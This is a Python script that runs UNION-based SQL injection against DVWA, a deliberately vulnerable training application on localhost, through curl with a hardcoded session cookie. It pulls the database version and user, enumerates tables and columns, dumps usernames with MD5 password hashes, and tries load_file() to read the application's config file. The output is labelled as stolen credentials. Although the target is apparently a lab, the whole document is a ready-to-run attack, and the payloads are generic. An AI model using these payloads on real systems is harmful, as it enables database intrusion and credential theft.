
import subprocess, re, html as htmlmod

session = "cqnjvjkri6aanknl88pue0m9d7"

def sqli_extract(query_encoded):
    """Send SQLi and extract column1/column2 from response"""
    r = subprocess.run(
        ['curl', '-s', '-b', f'PHPSESSID={session}; security=low',
         f"http://localhost:28080/vulnerabilities/sqli/?id={query_encoded}&Submit=Submit"],
        capture_output=True, text=True
    )
    results = []
    # Find ALL <pre> blocks
    pre_blocks = re.findall(r'<pre>(.*?)</pre>', r.stdout, re.DOTALL)
    for block in pre_blocks:
        # Clean HTML
        clean = htmlmod.unescape(block.replace('<br />', '\n').replace('<br>', '\n'))
        clean = re.sub(r'<[^>]+>', '', clean)
        lines = clean.strip().split('\n')
        
        col1 = col2 = None
        for line in lines:
            if line.startswith('First name: '):
                col1 = line.replace('First name: ', '').strip()
            elif line.startswith('Surname: '):
                col2 = line.replace('Surname: ', '').strip()
            elif line.startswith('ID: ') and not line.startswith("ID: 1'"):
                col1 = line.replace('ID: ', '').strip()
        if col1 and col1 != '1':  # Skip test values
            results.append((col1, col2))
    return results

print("=" * 60)
print("  🔴 DVWA SQL INJECTION — FULL DATABASE EXFILTRATION")
print("=" * 60)

# 1. Database Version
print("\n[1] DATABASE VERSION:")
ver = sqli_extract("1%27+UNION+SELECT+@@version,2%23")
for c1, c2 in ver:
    print(f"    MySQL Version: {c1}")

# 2. Current User & Database
print("\n[2] CURRENT USER & DATABASE:")
usr = sqli_extract("1%27+UNION+SELECT+current_user(),database()%23")
for c1, c2 in usr:
    print(f"    User: {c1}  |  Database: {c2}")

# 3. All Tables
print("\n[3] ALL TABLES IN DATABASE:")
tables = sqli_extract("1%27+UNION+SELECT+table_name,table_schema+FROM+information_schema.tables+WHERE+table_schema%3Ddatabase()%23")
for c1, c2 in tables:
    print(f"    - {c1} (schema: {c2})")

# 4. Users table columns
print("\n[4] USERS TABLE COLUMNS:")
cols = sqli_extract("1%27+UNION+SELECT+column_name,data_type+FROM+information_schema.columns+WHERE+table_name%3D%27users%27%23")
for c1, c2 in cols:
    print(f"    - {c1} ({c2})")

# 5. DUMP ALL CREDENTIALS
print("\n[5] 🏴 STOLEN CREDENTIALS — FULL USER TABLE DUMP:")
print("    " + "-" * 56)
print(f"    {'Username':<15} {'MD5 Password Hash':<40}")
print("    " + "-" * 56)
creds = sqli_extract("1%27+UNION+SELECT+user,password+FROM+users%23")
for c1, c2 in creds:
    print(f"    {c1:<15} {c2}")

# 6. Read config files via load_file()
print("\n[6] SENSITIVE FILE READ (DVWA config):")
cfg = sqli_extract("1%27+UNION+SELECT+load_file(%27/var/www/html/config/config.inc.php%27),2%23")
for c1, c2 in cfg:
    if len(c1) > 5:
        print(f"    {c1[:300]}")
    else:
        print(f"    (load_file blocked or empty)")

print("\n" + "=" * 60)
print(f"  EXTRACTED {len(creds)} USER ACCOUNTS FROM DATABASE")
print("  SEVERITY: CRITICAL — Full credential database theft")
print("=" * 60)

